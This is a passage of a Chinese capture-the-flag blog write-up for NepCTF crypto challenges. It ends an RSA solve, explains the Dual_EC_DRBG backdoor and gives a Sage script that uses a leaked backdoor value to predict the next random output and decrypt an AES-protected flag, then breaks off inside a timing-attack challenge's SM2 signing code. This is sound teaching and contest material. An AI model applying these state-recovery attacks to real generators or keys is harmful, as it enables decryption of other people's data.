class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;never_ignore_basic_math&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="bd-key"><a href="#bd-key" class="headerlink" title="bd_key"></a>bd_key</h3><blockquote><p>本题flag格式: NepCTF{xxx}</p><p>master of pwn一下就解出了明文，因为有后门（本题与pwn无关）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> FLAG <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"> Note: I have modified Dual_EC a little bit.</span></span><br><span class="line"><span class="string">    It would be EASIER for you to exploit it.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dual_EC</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, s_0=<span class="literal">None</span></span>):</span></span><br><span class="line">        <span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getRandomNBitInteger</span><br><span class="line">       </span><br><span class="line">        <span class="comment"># Init curve P-256</span></span><br><span class="line">        self.p = <span class="number">115792089210356248762697446949407573530086143415290314195533631308867097853951</span></span><br><span class="line">        self.n = <span class="number">115792089210356248762697446949407573529996955224135760342422259061068512044369</span></span><br><span class="line">        self.b = <span class="number">0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b</span></span><br><span class="line">        self.curve = EllipticCurve(GF(self.p), [-<span class="number">3</span>, self.b])</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Init P, Q</span></span><br><span class="line">        self.Qx = <span class="number">0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296</span></span><br><span class="line">        self.Qy = <span class="number">0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5</span></span><br><span class="line">        self.Q = self.curve(self.Qx, self.Qy)</span><br><span class="line">        self.d = getRandomNBitInteger(<span class="number">256</span>)</span><br><span class="line">        self.P = self.d * self.Q      </span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Init state, h_adin</span></span><br><span class="line">        <span class="keyword">if</span> s_0 == <span class="literal">None</span>:</span><br><span class="line">            self.s_i = <span class="built_in">int</span>(floor((<span class="number">2</span>^<span class="number">16</span>-<span class="number">1</span>)*random()))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.s_i = s_0</span><br><span class="line">        self.h_adin = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        self.__leak_par()</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__leak_par</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;curve = <span class="subst">&#123;self.curve&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;P = <span class="subst">&#123;self.P&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;d = <span class="subst">&#123;self.d&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Q = <span class="subst">&#123;self.Q&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Output 32bytes now.          </span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__Dual_EC_DRBG</span>(<span class="params">self, h_adin = <span class="number">0</span></span>):</span> </span><br><span class="line">        t_i = self.s_i ^^ h_adin</span><br><span class="line">        self.s_i = (t_i*self.P)[<span class="number">0</span>].lift()</span><br><span class="line">        r_i = (self.s_i*self.Q)[<span class="number">0</span>].lift()</span><br><span class="line">        <span class="keyword">return</span> r_i</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getRandomNBytes</span>(<span class="params">self, N:<span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span></span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">        req = (N/<span class="number">32</span>).ceil()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(req):</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">0</span>):</span><br><span class="line">                result = (result &lt;&lt; (<span class="number">32</span>*<span class="number">8</span>)) | self.__Dual_EC_DRBG(self.h_adin)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = (result &lt;&lt; (<span class="number">32</span>*<span class="number">8</span>)) | self.__Dual_EC_DRBG()</span><br><span class="line"></span><br><span class="line">        self.s_i = (self.s_i * self.P)[<span class="number">0</span>].lift()</span><br><span class="line"></span><br><span class="line">        result = result &gt;&gt; ((<span class="number">32</span>*req - N)*<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">return</span> long_to_bytes(result)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_flag</span>(<span class="params">key:<span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span></span><br><span class="line">    <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">    <span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line">    <span class="keyword">from</span> FLAG3 <span class="keyword">import</span> flag</span><br><span class="line">    </span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    flag_pad = pad(flag, <span class="number">16</span>)</span><br><span class="line">    ct = cipher.encrypt(flag_pad)</span><br><span class="line">    <span class="keyword">return</span> ct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_schnorr_identification</span>(<span class="params">dbrg</span>):</span></span><br><span class="line">    p = getPrime(<span class="number">256</span>)</span><br><span class="line">    Zp = Zmod(p)</span><br><span class="line">    g = Zp(<span class="number">2</span>)</span><br><span class="line">    q = g.multiplicative_order()</span><br><span class="line">    Zq = Zmod(q)</span><br><span class="line">    k = <span class="number">10</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">SchnorrProver</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">            self.secret_key = Zq.random_element()</span><br><span class="line">            self.public_key = g^self.secret_key</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">commit</span>(<span class="params">self</span>):</span></span><br><span class="line">            self.r = Zq.random_element()</span><br><span class="line">            <span class="keyword">return</span> g^self.r</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">respond</span>(<span class="params">self, challenge</span>):</span></span><br><span class="line">            <span class="keyword">return</span> self.r - challenge*self.secret_key</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">SchnorrVerifier</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, prover_public_key</span>):</span></span><br><span class="line">            self.prover_public_key = prover_public_key</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">challenge</span>(<span class="params">self, commitment</span>):</span></span><br><span class="line">            self.commitment = commitment</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                c = bytes_to_long(dbrg.getRandomNBytes(<span class="number">32</span>))</span><br><span class="line">                <span class="keyword">if</span> c &lt; p:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            self.challenge_number = c</span><br><span class="line">            <span class="keyword">return</span> self.challenge_number</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self, response</span>):</span></span><br><span class="line">            check_value = g^response*self.prover_public_key^self.challenge_number</span><br><span class="line">            <span class="keyword">return</span> self.commitment == check_value</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_protocol</span>(<span class="params">iterations=<span class="number">1</span></span>):</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(iterations):</span><br><span class="line">            prover = SchnorrProver()</span><br><span class="line">            verifier = SchnorrVerifier(prover.public_key)</span><br><span class="line">            t = prover.commit()</span><br><span class="line">            c = verifier.challenge(t)</span><br><span class="line">            s = prover.respond(c)</span><br><span class="line">            <span class="keyword">assert</span>(verifier.check(s))</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">    run_protocol()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    dbrg = Dual_EC()</span><br><span class="line">    do_schnorr_identification(dbrg)</span><br><span class="line">    key = dbrg.getRandomNBytes(<span class="number">16</span>)</span><br><span class="line">    ct = encrypt_flag(key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;ct = <span class="subst">&#123;bytes_to_long(ct)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># curve = Elliptic Curve defined by y^2 = x^3 + 115792089210356248762697446949407573530086143415290314195533631308867097853948*x + 41058363725152142129326129780047268409114441015993725554835256314039467401291 over Finite Field of size 115792089210356248762697446949407573530086143415290314195533631308867097853951</span><br><span class="line"># P = (72696788778535848020209987825324097844942627382508830211685965810687985426258 : 49180397040468497821240854375656422791216946832858522054245540263375986110762 : 1)</span><br><span class="line"># d = 66604141534275704476445937214374130642068729921454877238730830814793201802544</span><br><span class="line"># Q = (48439561293906451759052585252797914202762949526041747995844080717082404635286 : 36134250956749795798585127919587881956611106672985015071877198253568414405109 : 1)</span><br><span class="line"># c = 59100197418944667413449341413044666843726352095054393072750502893110293231642</span><br><span class="line"># ct = 25645992443585671366815910836517434170297823176311632150463962979581372384075859802765045877741181123347569267185176</span><br></pre></td></tr></table></figure></blockquote><p>双椭圆曲线确定性随机数发生器（Dual_EC_DRBG）的一个后门，原理：</p><p>设每一步的 $\text{state}$ 为 $s_i$，随机数为 $r_i$，随机数对应的椭圆曲线上的点为 $R_i$。</p><p>对于攻击者来说，已知 $P$、$Q$、$d$、$r_{i-1}$，而 $s_i$ 未知。于是有：</p><p>$\begin{cases} ((s_i \cdot P)_x \cdot P)_x &amp; \rightarrow s_{i+1} \newline ((s_i \cdot P)_x \cdot Q)_x &amp; \rightarrow r_i \end{cases}$</p><p>后门为构造 $d \cdot r_{i-1}$，其恰好是 $s_i$，看似安全的体制被攻破。</p><p>记 $k_i = (s_i \cdot P)_x$，有：</p><p>$\begin{align} d \cdot r_{i-1} &amp; = {(d \cdot R_{i-1})_x = (d \cdot k_{i-1} \cdot Q)_x} = {(k_{i-1} \cdot d \cdot Q)_x = (k_{i-1} \cdot P)_x} = {((s_{i-1} \cdot P)_x \cdot P)_x = s_i} \end{align}$</p><p>题里 $c=r_{i-1}$，构造 $d \cdot c = s_i$，则可以推出下一个随机数 $r_i=((s_i \cdot P)_x \cdot Q)_x$，取高16*8位为AES的Key。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">a = <span class="number">115792089210356248762697446949407573530086143415290314195533631308867097853948</span></span><br><span class="line">b = <span class="number">41058363725152142129326129780047268409114441015993725554835256314039467401291</span></span><br><span class="line">p = <span class="number">115792089210356248762697446949407573530086143415290314195533631308867097853951</span></span><br><span class="line">E = EllipticCurve(GF(p),[a,b])</span><br><span class="line">n = <span class="number">115792089210356248762697446949407573529996955224135760342422259061068512044369</span></span><br><span class="line">P = (<span class="number">72696788778535848020209987825324097844942627382508830211685965810687985426258</span>, <span class="number">49180397040468497821240854375656422791216946832858522054245540263375986110762</span>)</span><br><span class="line">d = <span class="number">66604141534275704476445937214374130642068729921454877238730830814793201802544</span></span><br><span class="line">Q = (<span class="number">48439561293906451759052585252797914202762949526041747995844080717082404635286</span>, <span class="number">36134250956749795798585127919587881956611106672985015071877198253568414405109</span>)</span><br><span class="line">c = <span class="number">59100197418944667413449341413044666843726352095054393072750502893110293231642</span></span><br><span class="line">ct = <span class="number">25645992443585671366815910836517434170297823176311632150463962979581372384075859802765045877741181123347569267185176</span></span><br><span class="line"></span><br><span class="line">P = E(P)</span><br><span class="line">Q = E(Q)</span><br><span class="line">R0 = E.lift_x(c)</span><br><span class="line">s1 = (d*R0)[<span class="number">0</span>]</span><br><span class="line">s2 = ((s1*P)[<span class="number">0</span>]*P)[<span class="number">0</span>]</span><br><span class="line">r1 = ((s1*P)[<span class="number">0</span>]*Q)[<span class="number">0</span>]</span><br><span class="line">key = r1 &gt;&gt; ((<span class="number">32</span> - <span class="number">16</span>)*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">key = long_to_bytes(key)</span><br><span class="line">ct = long_to_bytes(ct)</span><br><span class="line"><span class="built_in">print</span>(cipher.decrypt(ct))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;NepCTF&#123;NS4_b4ckd00r_1n_ps3ud0_r4nd0m_g3n3r4t0r&#125;\x01&#x27; </span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="timing"><a href="#timing" class="headerlink" title="timing"></a>timing</h3><blockquote><p>牢不可破的算法，或许会在其他地方出现问题？<br>(容器下发后，师傅自行nc哦～～～)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> perf_counter_ns <span class="keyword">as</span> clock1</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ecc_table = &#123;</span><br><span class="line">    <span class="string">&#x27;n&#x27;</span>: <span class="string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;p&#x27;</span>: <span class="string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFF&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;g&#x27;</span>: <span class="string">&#x27;32c4ae2c1f1981195f9904466a39c9948fe30bbff2660be1715a4589334c74c7&#x27;</span></span><br><span class="line">         <span class="string">&#x27;bc3736a2f4f6779c59bdcee36b692153d0a9877cc62a474002df32e52139f0a0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFC&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;28E9FA9E9D9F5E344D5A9E4BCF6509A7F39789F515AB8F92DDBCBD414D940E93&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;O&#x27;</span>: <span class="string">&#x27;0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line">         <span class="string">&#x27;0000000000000000000000000000000000000000000000000000000000000000&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TSM2</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, sk</span>):</span></span><br><span class="line">        self.ecc_table = ecc_table</span><br><span class="line">        self.n = <span class="built_in">int</span>(ecc_table[<span class="string">&#x27;n&#x27;</span>], <span class="number">16</span>)</span><br><span class="line">        self.para_len = <span class="built_in">len</span>(ecc_table[<span class="string">&#x27;n&#x27;</span>])</span><br><span class="line">        self.ecc_a3 = (<span class="built_in">int</span>(ecc_table[<span class="string">&#x27;a&#x27;</span>], base=<span class="number">16</span>) +</span><br><span class="line">                       <span class="number">3</span>) % <span class="built_in">int</span>(ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">        self.sk = sk</span><br><span class="line">        self.pk = self.kg(self.sk, ecc_table[<span class="string">&#x27;g&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sign</span>(<span class="params">self, data, K</span>):</span></span><br><span class="line">        e = data</span><br><span class="line">        d = self.sk</span><br><span class="line">        k = K</span><br><span class="line"></span><br><span class="line">        P1 = self.kg(k, self.ecc_table[<span class="string">&#x27;g&#x27;</span>])</span><br><span class="line">        x = <span class="built_in">int</span>(P1[<span class="number">0</span>:self.para_len], <span class="number">16</span>)</span><br><span class="line">        R = ((e + x) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;n&#x27;</span>], base=<span class="number">16</span>))</span><br><span class="line">        <span class="keyword">if</span> R == <span class="number">0</span> <span class="keyword">or</span> R + k == <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;n&#x27;</span>], base=<span class="number">16</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        d_1 = <span class="built_in">pow</span>(</span><br><span class="line">            d+<span class="number">1</span>, <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;n&#x27;</span>], base=<span class="number">16</span>) - <span class="number">2</span>, <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;n&#x27;</span>], base=<span class="number">16</span>))</span><br><span class="line">        S = (d_1*(k + R) - R) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;n&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> S == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;%064x%064x&#x27;</span> % (R, S)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">verify</span>(<span class="params">self, Sign, data</span>):</span></span><br><span class="line">        r = <span class="built_in">int</span>(Sign[<span class="number">0</span>:self.para_len], <span 